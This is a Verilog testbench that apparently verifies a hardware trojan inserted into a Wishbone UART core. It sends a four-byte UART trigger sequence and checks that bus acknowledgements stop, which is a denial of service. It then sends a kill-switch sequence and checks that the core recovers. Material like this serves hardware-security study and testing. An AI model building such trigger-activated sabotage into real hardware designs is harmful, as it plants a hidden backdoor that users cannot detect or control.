`timescale 1ns/1ps

module wbuart_tb;

    localparam CLK_PERIOD = 10;
    localparam BIT_PERIOD = CLK_PERIOD * 25;
    localparam UART_SETUP_ADDR = 2'b00;
    localparam UART_TXREG_ADDR = 2'b11;
    localparam UART_CONFIG_VALUE = 32'd25;

    reg i_clk;
    reg i_reset;
    reg i_wb_cyc;
    reg i_wb_stb;
    reg i_wb_we;
    reg [1:0] i_wb_addr;
    reg [31:0] i_wb_data;
    reg [3:0] i_wb_sel;
    reg i_uart_rx;

    wire o_wb_stall;
    wire o_wb_ack;
    wire [31:0] o_wb_data;
    wire o_uart_tx;
    
    reg dut_rx_stb_last;

    wbuart dut (
        .i_clk(i_clk), .i_reset(i_reset),
        .i_wb_cyc(i_wb_cyc), .i_wb_stb(i_wb_stb), .i_wb_we(i_wb_we),
        .i_wb_addr(i_wb_addr), .i_wb_data(i_wb_data), .i_wb_sel(i_wb_sel),
        .o_wb_stall(o_wb_stall), .o_wb_ack(o_wb_ack), .o_wb_data(o_wb_data),
        .i_uart_rx(i_uart_rx), .o_uart_tx(o_uart_tx)
    );

    always #(CLK_PERIOD/2) i_clk = ~i_clk;

    task send_uart_byte(input [7:0] data);
        integer i;
    begin
        i_uart_rx = 1'b0; #(BIT_PERIOD);
        for (i = 0; i < 8; i = i + 1) begin
            i_uart_rx = data[i]; #(BIT_PERIOD);
        end
        i_uart_rx = 1'b1; #(BIT_PERIOD);
    end
    endtask

    initial begin
        $dumpfile("trojan_debug.vcd");
        $dumpvars(0, wbuart_tb);
    end

    always @(posedge i_clk) dut_rx_stb_last <= dut.rx_stb;
    always @(posedge i_clk) begin
        if (!dut_rx_stb_last && dut.rx_stb) begin
            $display("--- TB DEBUG @ %0t --- Byte Received ---", $time);
            $display("  DUT sees rx_uart_data: 0x%h", dut.rx_uart_data);
            $display("  Trojan rx_history (before shift): 0x%h", dut.rx_history);
        end
    end

    initial begin
        $display("--- Trojan Verification Testbench ---");
        i_clk = 0; i_reset = 1; i_wb_cyc = 0; i_wb_stb = 0; i_wb_we = 0;
        i_wb_addr = 0; i_wb_data = 0; i_wb_sel = 0; i_uart_rx = 1'b1;
        dut_rx_stb_last = 0;
        
        repeat (5) @(posedge i_clk);
        i_reset = 0; $display("[%0t] Reset released.", $time);
        repeat (10) @(posedge i_clk);

        $display("\n[PHASE 1] Testing normal Wishbone operation...");
        i_wb_cyc <= 1'b1; i_wb_stb <= 1'b1; i_wb_we <= 1'b1;
        i_wb_addr <= UART_TXREG_ADDR; i_wb_data <= 32'hDEADBEEF; i_wb_sel <= 4'b1111;
        wait (o_wb_ack);
        $display("[%0t] Phase 1 PASSED: Wishbone ACK received.", $time);
        i_wb_cyc <= 1'b0; i_wb_stb <= 1'b0;
        repeat (10) @(posedge i_clk);
        
        // ***************************************************************
        // *** FIX: Explicitly configure the DUT's baud rate         ***
        // ***************************************************************
        $display("\n[PHASE 1.5] Explicitly configuring UART...");
        i_wb_cyc <= 1'b1; i_wb_stb <= 1'b1; i_wb_we <= 1'b1;
        i_wb_addr <= UART_SETUP_ADDR; i_wb_data <= UART_CONFIG_VALUE; i_wb_sel <= 4'b1111;
        wait (o_wb_ack);
        $display("[%0t] Phase 1.5 PASSED: UART configured.", $time);
        i_wb_cyc <= 1'b0; i_wb_stb <= 1'b0;
        repeat (10) @(posedge i_clk);
        
        $display("\n[PHASE 2] Sending Trojan trigger sequence...");
        send_uart_byte(8'h10); send_uart_byte(8'hA4); send_uart_byte(8'h98); send_uart_byte(8'hBD);
        $display("[%0t] Trigger sequence sent.", $time);
        repeat (10) @(posedge i_clk);
        
        $display("\n[PHASE 3] Verifying DoS. Attempting Wishbone transaction...");
        i_wb_cyc <= 1'b1; i_wb_stb <= 1'b1;
        fork : dos_check_fork
            begin : wb_transaction_attempt
                wait(o_wb_ack);
                $error("Phase 3 FAILED: Wishbone ACK received, DoS is not active!");
                $finish;
            end
            begin : timeout
                #(BIT_PERIOD * 50); 
                $display("Phase 3 PASSED: Timeout reached. Wishbone ACK was NOT received. DoS is active.");
            end
        join_any
        disable dos_check_fork;
        
        i_wb_cyc <= 1'b0; i_wb_stb <= 1'b0;
        
        $display("\n[PHASE 4] Sending Trojan kill-switch sequence...");
        send_uart_byte(8'hFE); send_uart_byte(8'hFE); send_uart_byte(8'hFE); send_uart_byte(8'hFE);
        $display("[%0t] Kill-switch sequence sent.", $time);
        repeat (10) @(posedge i_clk);
        
        $display("\n[PHASE 5] Verifying recovery. Attempting Wishbone transaction...");
        i_wb_cyc <= 1'b1; i_wb_stb <= 1'b1;
        wait (o_wb_ack);
        $display("[%0t] Phase 5 PASSED: Wishbone ACK received. System recovered.", $time);
        i_wb_cyc <= 1'b0; i_wb_stb <= 1'b0;

        $display("\n\n--- All tests completed successfully! ---");
        $finish;
    end

endmodule